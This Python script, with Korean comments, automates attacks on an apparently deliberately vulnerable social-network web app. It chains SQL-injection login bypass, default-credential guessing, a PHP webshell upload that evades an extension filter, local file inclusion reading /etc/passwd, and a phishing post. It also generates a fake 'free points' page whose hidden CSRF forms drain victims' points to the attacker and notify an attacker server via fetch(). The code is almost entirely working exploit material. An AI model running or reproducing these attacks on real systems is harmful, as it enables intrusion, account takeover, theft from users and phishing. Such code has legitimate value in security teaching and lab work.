import requests
from bs4 import BeautifulSoup
from urllib.parse import quote
import time
import json
import re

class VulnerableSNSAttacker:
    def __init__(self, base_url, attacker_server):
        self.base_url = base_url.rstrip('/')
        self.attacker_server = attacker_server.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = {
            'sql_injection': [],
            'xss': [],
            'csrf': [],
            'lfi': [],
            'file_upload': []
        }
        self.logged_in = False
        self.current_points = 0
        self.attacker_user_id = None
        self.uploaded_webshell = None
    
    def print_section(self, title):
        print("\n" + "="*60)
        print(f"{title}")
        print("="*60)
    
    def get_attacker_user_id(self):
        """공격자의 user_id 확인"""
        try:
            response = self.session.get(f"{self.base_url}/profile.php")
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # user_id를 hidden input에서 찾기
            user_id_input = soup.find('input', {'name': 'user_id'})
            if user_id_input:
                self.attacker_user_id = user_id_input.get('value')
                print(f"[*] Attacker User ID: {self.attacker_user_id}")
                return self.attacker_user_id
            
            # URL에서 찾기
            profile_link = soup.find('a', href=re.compile(r'profile\.php\?user='))
            if profile_link:
                match = re.search(r'user=(\d+)', profile_link['href'])
                if match:
                    self.attacker_user_id = match.group(1)
                    print(f"[*] Attacker User ID: {self.attacker_user_id}")
                    return self.attacker_user_id
            
            # 세션에서 직접 가져오기 시도
            if 'user_id' in self.session.cookies:
                self.attacker_user_id = self.session.cookies['user_id']
                print(f"[*] Attacker User ID from cookie: {self.attacker_user_id}")
                return self.attacker_user_id
            
            # SQL Injection으로 user_id 확인
            response = self.session.get(f"{self.base_url}/index.php")
            match = re.search(r'user_id\s*=\s*(\d+)', response.text)
            if match:
                self.attacker_user_id = match.group(1)
                print(f"[*] Attacker User ID from page: {self.attacker_user_id}")
                return self.attacker_user_id
                    
        except Exception as e:
            print(f"[-] Error getting user ID: {e}")
        
        # 기본값: admin은 보통 ID 1
        self.attacker_user_id = "1"
        print(f"[*] Using default User ID: {self.attacker_user_id}")
        return self.attacker_user_id
    
    def test_sql_injection_login(self):
        """SQL Injection - password 필드 공격"""
        self.print_section("SQL Injection - Login Bypass")
        
        login_url = f"{self.base_url}/login.php"
        
        print("[*] Testing SQL Injection payloads...")
        
        # Username 필드에서 블랙리스트 우회
        payloads = [
            ("admin", '" or "1"="1" --', 'Double quote OR bypass'),
            ("admin", '" or 1=1 --', 'Double quote numeric OR'),
            ('admin" or "a"="a" --', 'anything', 'Username field injection'),
            ('admin" --', 'anything', 'Comment out password'),
        ]
        
        for username, password, desc in payloads:
            try:
                print(f"\n[*] Trying: {desc}")
                print(f"    Username: {username}")
                print(f"    Password: {password}")
                
                data = {'username': username, 'password': password}
                response = self.session.post(login_url, data=data, allow_redirects=True, timeout=10)
                
                if 'index.php' in response.url or response.url.endswith('/www/') or response.url.endswith('/www'):
                    print(f"[+] SUCCESS! Logged in")
                    print(f"    Final URL: {response.url}")
                    
                    soup = BeautifulSoup(response.text, 'html.parser')
                    points_text = soup.find(text=re.compile(r'\d+\s*P'))
                    if points_text:
                        points_match = re.search(r'(\d+)\s*P', points_text)
                        if points_match:
                            self.current_points = int(points_match.group(1))
                            print(f"    Current Points: {self.current_points}P")
                    
                    self.logged_in = True
                    self.get_attacker_user_id()
                    
                    self.vulnerabilities['sql_injection'].append({
                        'url': login_url,
                        'username': username,
                        'password': password,
                        'description': desc
                    })
                    return True
                else:
                    print(f"[-] Failed - Still on: {response.url}")
                    
            except Exception as e:
                print(f"[-] Error: {str(e)[:50]}")
        
        print("\n[*] Trying default credentials...")
        default_creds = [
            ("admin", "admin123"),
            ("alice", "alice2024"),
            ("bob", "bobby123"),
        ]
        
        for username, password in default_creds:
            try:
                print(f"[*] Trying: {username}/{password}")
                data = {'username': username, 'password': password}
                response = self.session.post(login_url, data=data, allow_redirects=True, timeout=10)
                
                if 'index.php' in response.url or response.url.endswith('/www/') or response.url.endswith('/www'):
                    print(f"[+] SUCCESS with default credentials")
                    self.logged_in = True
                    
                    soup = BeautifulSoup(response.text, 'html.parser')
                    points_text = soup.find(text=re.compile(r'\d+\s*P'))
                    if points_text:
                        points_match = re.search(r'(\d+)\s*P', points_text)
                        if points_match:
                            self.current_points = int(points_match.group(1))
                    
                    self.get_attacker_user_id()
                    return True
            except:
                continue
        
        return False
    
    def test_file_upload_rce(self):
        """File Upload - 웹쉘 업로드"""
        self.print_section("File Upload - Webshell Upload")
        
        if not self.logged_in:
            print("[-] Login required")
            return False
        
        upload_url = f"{self.base_url}/upload.php"
        file_url = f"{self.base_url}/file.php"
        
        webshell_code = b'<?php system($_GET["cmd"]); ?>'
        
        test_files = [
            ('shell.php5', 'PHP5 extension'),
            ('shell.phtml', 'PHTML extension'),
            ('shell.php3', 'PHP3 extension'),
        ]
        
        print("[*] Uploading webshell (bypassing .php filter)...")
        
        for filename, desc in test_files:
            try:
                print(f"\n[*] Trying: {filename} ({desc})")
                
                files = {'file': (filename, webshell_code, 'application/x-php')}
                response = self.session.post(upload_url, files=files, allow_redirects=True)
                
                if 'success' in response.text.lower() or 'uploaded' in response.text.lower() or filename in response.text:
                    print(f"[+] File uploaded successfully")
                    
                    print(f"\n[*] Testing webshell execution via LFI...")
                    commands = ['whoami', 'id', 'pwd']
                    
                    for cmd in commands:
                        try:
                            params = {'name': filename, 'cmd': cmd}
                            cmd_response = self.session.get(file_url, params=params, timeout=10)
                            
                            soup = BeautifulSoup(cmd_response.text, 'html.parser')
                            content_div = soup.find('div', class_='file-content')
                            
                            if content_div:
                                output = content_div.get_text(strip=True)
                                
                                if output and '<?php' not in output and len(output) < 200:
                                    print(f"\n[+] SUCCESS! Command executed: {cmd}")
                                    print(f"    Output: {output}")
                                    
                                    self.uploaded_webshell = filename
                                    
                                    self.vulnerabilities['file_upload'].append({
                                        'upload_url': upload_url,
                                        'filename': filename,
                                        'command': cmd,
                                        'output': output,
                                        'access_url': f"{file_url}?name={filename}&cmd={cmd}"
                                    })
                                    
                                    return True
                            
                        except Exception as e:
                            print(f"[-] Command execution error: {str(e)[:50]}")
                            continue
                    
                else:
                    print(f"[-] Upload failed or blocked")
                    
            except Exception as e:
                print(f"[-] Upload error: {str(e)[:50]}")
        
        return False
    
    def test_lfi(self):
        """LFI - Local File Inclusion"""
        self.print_section("LFI - Local File Inclusion")
        
        if not self.logged_in:
            print("[-] Login required")
            return False
        
        file_url = f"{self.base_url}/file.php"
        
        print("[*] Testing LFI payloads...")
        
        lfi_payloads = [
            ("../../etc/passwd", "root:", "passwd file (2 levels)"),
            ("/etc/passwd", "root:", "passwd file (absolute)"),
            ("../../etc/hosts", "localhost", "hosts file"),
        ]
        
        if self.uploaded_webshell:
            lfi_payloads.append((self.uploaded_webshell, "www-data", f"Uploaded webshell: {self.uploaded_webshell}"))
        
        success_count = 0
        
        for payload, indicator, desc in lfi_payloads:
            try:
                print(f"\n[*] Testing: {desc}")
                print(f"    Payload: {payload}")
                
                if payload == self.uploaded_webshell:
                    params = {'name': payload, 'cmd': 'whoami'}
                else:
                    params = {'name': payload}
                    
                response = self.session.get(file_url, params=params, timeout=10)
                
                if indicator in response.text:
                    print(f"[+] SUCCESS! File read: {indicator} found")
                    
                    soup = BeautifulSoup(response.text, 'html.parser')
                    content = soup.find('div', class_='file-content')
                    if content:
                        text = content.get_text(strip=True)
                        print(f"    Content preview: {text[:100]}...")
                    
                    success_count += 1
                    self.vulnerabilities['lfi'].append({
                        'url': file_url,
                        'payload': payload,
                        'description': desc
                    })
                else:
                    print(f"[-] File not found or blocked")
                    
            except Exception as e:
                print(f"[-] Error: {str(e)[:50]}")
        
        print(f"\n[*] LFI Results: {success_count}/{len(lfi_payloads)} successful")
        return success_count > 0
    
    def test_xss_csrf_combined(self):
        """XSS + CSRF Combined Attack - 직접 링크 방식"""
        self.print_section("XSS + CSRF - Malicious Post with Direct Link")
        
        if not self.logged_in:
            print("[-] Login required")
            return False
        
        if not self.attacker_user_id:
            print("[-] Attacker user ID not found")
            return False
        
        post_url = f"{self.base_url}/new_post.php"
        attacker_url = f"{self.attacker_server}/fake-gift"
        
        print(f"[*] Creating malicious post with link to attacker server")
        print(f"[*] Attacker User ID: {self.attacker_user_id}")
        print(f"[*] Target URL: {attacker_url}")
        
        # 간단한 링크 방식 (가장 확실함)
        payload = f'''🎁 특별 이벤트! 🎁

무료 10,000 포인트 받기!
지금 클릭하세요: {attacker_url}

선착순 100명! 서두르세요!'''
        
        try:
            print(f"\n[*] Posting malicious content with direct link")
            print(f"    Content: {payload[:100]}...")
            
            data = {'content': payload}
            response = self.session.post(post_url, data=data, allow_redirects=True, timeout=10)
            
            if 'index.php' in response.url:
                print(f"[+] Post created!")
                
                time.sleep(0.5)
                check = self.session.get(f"{self.base_url}/index.php")
                
                if attacker_url in check.text:
                    print(f"[+] SUCCESS! Malicious post is live on feed!")
                    print(f"[+] Attack URL: {attacker_url}")
                    print(f"\n[*] Attack Flow:")
                    print(f"    1. Victim views main feed (index.php)")
                    print(f"    2. Victim clicks the link")
                    print(f"    3. Redirected to {attacker_url}")
                    print(f"    4. fake-gift page performs CSRF attack")
                    print(f"    5. Gifts sent to attacker (ID: {self.attacker_user_id})")
                    print(f"    6. Monitor at: {self.attacker_server}")
                    
                    self.vulnerabilities['xss'].append({
                        'url': post_url,
                        'payload': payload,
                        'description': 'Direct link to attacker server',
                        'attack_type': 'phishing_csrf',
                        'target_url': attacker_url,
                        'attacker_id': self.attacker_user_id
                    })
                    
                    return True
                else:
                    print(f"[-] Link not found in feed")
            else:
                print(f"[-] Post creation failed")
                
        except Exception as e:
            print(f"[-] Error: {str(e)[:100]}")
        
        return False
    
    def generate_fake_gift_page(self):
        """개선된 fake-gift 페이지 생성 - Same-Origin 우회"""
        print("\n[*] Generating fake-gift.html for attacker server...")
        
        if not self.attacker_user_id:
            print("[-] Cannot generate: attacker user ID unknown")
            self.attacker_user_id = "1"
            print(f"[*] Using default attacker ID: 1 (admin)")
        
        fake_gift_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>🎁 무료 포인트 받기!</title>
    <meta charset="utf-8">
    <style>
        body {{
            font-family: 'Segoe UI', Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            margin: 0;
        }}
        .gift-box {{
            background: white;
            color: #333;
            padding: 50px;
            border-radius: 20px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: fadeIn 0.5s;
        }}
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: scale(0.9); }}
            to {{ opacity: 1; transform: scale(1); }}
        }}
        h1 {{
            color: #667eea;
            font-size: 2.5em;
            margin-bottom: 20px;
        }}
        .gift-icon {{
            font-size: 100px;
            animation: bounce 1s infinite;
        }}
        @keyframes bounce {{
            0%, 100% {{ transform: translateY(0); }}
            50% {{ transform: translateY(-20px); }}
        }}
        button {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 20px 50px;
            font-size: 1.2em;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
            transition: transform 0.2s;
        }}
        button:hover {{
            transform: scale(1.1);
        }}
        .loading {{
            display: none;
            margin-top: 20px;
            color: #667eea;
            font-size: 1.1em;
        }}
        .success {{
            display: none;
            color: #28a745;
            font-size: 1.5em;
            margin-top: 20px;
        }}
        #status {{
            background: #f0f0f0;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            color: #667eea;
            font-weight: bold;
            min-height: 60px;
        }}
    </style>
</head>
<body>
    <div class="gift-box">
        <div class="gift-icon">🎁</div>
        <h1>🎉 축하합니다!</h1>
        <p style="font-size: 1.5em;">10,000 포인트를 받으셨습니다!</p>
        <div id="status">자동으로 포인트를 받는 중...</div>
        <button onclick="claimGift()" id="claimBtn">💰 포인트 받기 💰</button>
        <div class="loading" id="loading">⏳ 처리 중...</div>
        <div class="success" id="success">✅ 완료!</div>
    </div>
    
    <!-- 숨겨진 CSRF 폼들 -->
    <div id="csrfForms"></div>
    
    <script>
        let attackExecuted = false;
        const ATTACKER_ID = '{self.attacker_user_id}';
        const TARGET_SNS = '{self.base_url}';
        
        // 페이지 로드 시 자동 실행
        window.onload = function() {{
            // 공격자 서버에 페이지 로드 알림
            fetch('{self.attacker_server}/notify?event=page_loaded&time=' + new Date().toISOString())
                .catch(() => {{}});
            
            // 상태 업데이트
            document.getElementById('status').innerHTML = '포인트를 받기 위해 준비 중...';
            
            // 2초 후 자동 실행
            setTimeout(() => {{
                executeCSRF();
            }}, 2000);
        }};
        
        function claimGift() {{
            if (attackExecuted) return;
            document.getElementById('claimBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            executeCSRF();
        }}
        
        function executeCSRF() {{
            if (attackExecuted) return;
            attackExecuted = true;
            
            document.getElementById('status').innerHTML = '포인트 전송 중...';
            document.getElementById('claimBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // 여러 금액으로 순차 공격 (하나라도 성공하면 OK)
            const amounts = [5000, 3000, 1000, 500, 300, 100];
            let formHTML = '';
            
            // 각 금액별로 폼 생성
            amounts.forEach((amount, index) => {{
                formHTML += `
                    <form id="csrfForm${{index}}" method="POST" action="${{TARGET_SNS}}/profile.php" style="display:none" target="iframe${{index}}">
                        <input type="hidden" name="send_gift" value="1">
                        <input type="hidden" name="receiver_id" value="${{ATTACKER_ID}}">
                        <input type="hidden" name="gift_type" value="diamond">
                        <input type="hidden" name="points" value="${{amount}}">
                        <input type="hidden" name="message" value="Event Gift ${{amount}}P">
                    </form>
                    <iframe id="iframe${{index}}" name="iframe${{index}}" style="display:none"></iframe>
                `;
            }});
            
            // GET 방식 CSRF도 추가 (프로필 변경)
            formHTML += `
                <img src="${{TARGET_SNS}}/profile.php?email=pwned@attacker.com&full_name=HACKED_BY_CSRF" 
                     style="display:none" 
                     onload="notifyProfileChange()">
            `;
            
            document.getElementById('csrfForms').innerHTML = formHTML;
            
            // 순차적으로 폼 제출 (0.5초 간격)
            amounts.forEach((amount, index) => {{
                setTimeout(() => {{
                    const form = document.getElementById('csrfForm' + index);
                    if (form) {{
                        form.submit();
                        console.log('[+] Submitted form for ' + amount + 'P');
                        
                        // 공격자 서버에 알림
                        fetch('{self.attacker_server}/notify?event=csrf_attempt&amount=' + amount + '&index=' + index)
                            .catch(() => {{}});
                        
                        // 상태 업데이트
                        document.getElementById('status').innerHTML = 
                            '시도 ' + (index + 1) + '/' + amounts.length + ': ' + amount + ' 포인트';
                    }}
                }}, index * 500);
            }});
            
            // 모든 시도 완료 후
            setTimeout(() => {{
                document.getElementById('loading').style.display = 'none';
                document.getElementById('success').innerHTML = 
                    '✅ 포인트 전송 완료!<br>곧 계정에 반영됩니다.';
                document.getElementById('success').style.display = 'block';
                document.getElementById('status').style.display = 'none';
                
                // 최종 성공 알림
                fetch('{self.attacker_server}/notify?event=csrf_completed&attempts=' + amounts.length)
                    .catch(() => {{}});
                
                console.log('[+] All CSRF attempts completed');
            }}, amounts.length * 500 + 1000);
        }}
        
        function notifyProfileChange() {{
            console.log('[+] Profile changed via GET CSRF');
            fetch('{self.attacker_server}/notify?event=profile_changed&method=GET')
                .catch(() => {{}});
        }}
    </script>
</body>
</html>"""
        
        with open("fake-gift.html", 'w', encoding='utf-8') as f:
            f.write(fake_gift_html)
        
        print(f"[+] fake-gift.html saved!")
        print(f"\n[*] 🚀 CSRF Attack Strategy:")
        print(f"    Method: Multiple sequential form submissions")
        print(f"    Amounts: 5000P, 3000P, 1000P, 500P, 300P, 100P")
        print(f"    Target: {self.base_url}/profile.php")
        print(f"    Receiver: User ID {self.attacker_user_id}")
        print(f"\n[*] 💡 How it works:")
        print(f"    1. Victim clicks link in malicious post")
        print(f"    2. fake-gift page loads on attacker server")
        print(f"    3. Hidden forms auto-submit to SNS (victim's session)")
        print(f"    4. Multiple amounts tried (one will succeed)")
        print(f"    5. GET CSRF changes victim's profile")
        print(f"    6. All attempts logged to attacker server")
        print(f"\n[*] 📊 Why this works:")
        print(f"    - No CSRF token validation in profile.php")
        print(f"    - Victim's session cookies sent automatically")
        print(f"    - Forms submitted in hidden iframes")
        print(f"    - Multiple amounts increase success rate")

    
    def run_assessment(self):
        """전체 평가 실행"""
        print("\n" + "="*60)
        print("Vulnerable SNS - Security Assessment")
        print("="*60)
        print(f"Target: {self.base_url}")
        print(f"Attacker Server: {self.attacker_server}")
        print("="*60)
        
        # 1. SQL Injection
        time.sleep(1)
        self.test_sql_injection_login()
        
        if not self.logged_in:
            print("\n[-] Login failed. Cannot continue.")
            return
        
        # 2. File Upload
        time.sleep(1)
        self.test_file_upload_rce()
        
        # 3. LFI
        time.sleep(1)
        self.test_lfi()
        
        # 4. XSS + CSRF Combined
        time.sleep(1)
        self.test_xss_csrf_combined()
        
        # 5. fake-gift 페이지 생성
        self.generate_fake_gift_page()
        
        # 결과 출력
        self.print_report()
    
    def print_report(self):
        """평가 결과 출력"""
        self.print_section("Assessment Report")
        
        total = sum(len(v) for v in self.vulnerabilities.values())
        print(f"\nTotal vulnerabilities found: {total}\n")
        
        for vuln_type, vulns in self.vulnerabilities.items():
            if vulns:
                print(f"\n[{vuln_type.upper()}] - {len(vulns)} found")
                print("-" * 60)
                for i, vuln in enumerate(vulns, 1):
                    print(f"{i}. {vuln.get('description', vuln.get('type', 'N/A'))}")
                    if 'url' in vuln:
                        print(f"   URL: {vuln['url']}")
                    if 'payload' in vuln:
                        print(f"   Payload: {vuln['payload'][:100]}...")
                    if 'output' in vuln:
                        print(f"   Output: {vuln['output'][:60]}")
                    if 'attacker_id' in vuln:
                        print(f"   Attacker User ID: {vuln['attacker_id']}")
                    if 'target_url' in vuln:
                        print(f"   Target URL: {vuln['target_url']}")
                    print()
        
        # JSON 저장
        report = {
            'vulnerabilities': self.vulnerabilities,
            'attacker_server': self.attacker_server,
            'attacker_user_id': self.attacker_user_id,
            'uploaded_webshell': self.uploaded_webshell
        }
        
        with open('assessment_report.json', 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] Report saved: assessment_report.json")
        print(f"[+] fake-gift.html saved")
        print(f"\n" + "="*60)
        print("CSRF Attack Instructions")
        print("="*60)
        print(f"[*] Setup:")
        print(f"    1. Upload fake-gift.html to Flask server")
        print(f"    2. Ensure Flask routes /fake-gift and /notify")
        print(f"    3. Victim must be logged into SNS")
        print(f"\n[*] Attack Flow:")
        print(f"    1. Victim views SNS feed")
        print(f"    2. Sees malicious post with link")
        print(f"    3. Clicks link to {self.attacker_server}/fake-gift")
        print(f"    4. Page auto-executes CSRF attack")
        print(f"    5. Multiple forms submit with victim's session")
        print(f"    6. Gifts sent to attacker (ID: {self.attacker_user_id})")
        print(f"    7. Victim's profile changed")
        print(f"\n[*] 📊 Monitoring:")
        print(f"    Flask logs: Check terminal output")
        print(f"    Dashboard: {self.attacker_server}")
        print(f"    Notifications: {self.attacker_server}/notify")
        print(f"\n[*] 🎯 Expected Results:")
        print(f"    - Victim's points decrease")
        print(f"    - Attacker's points increase")
        print(f"    - Victim's email changed to pwned@attacker.com")
        print(f"    - Victim's name changed to HACKED_BY_CSRF")
        print(f"\n[*] 💡 Why CSRF works:")
        print(f"    - profile.php has NO CSRF token validation")
        print(f"    - Accepts both POST and GET requests")
        print(f"    - Victim's session cookies sent automatically")
        print(f"    - Same-Origin Policy doesn't block form submission")


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python3 auto_fixed.py <target_url> <attacker_server>")
        print("Example: python3 auto_fixed.py http://18.179.53.107/vulnerable-sns/www http://13.158.67.78:5000")
        sys.exit(1)
    
    target = sys.argv[1]
    attacker_server = sys.argv[2]
    
    attacker = VulnerableSNSAttacker(target, attacker_server)
    attacker.run_assessment()
    
    print("\n" + "="*60)
    print("Assessment completed")
    print(f"Monitor attacks at: {attacker_server}")
    print("="*60)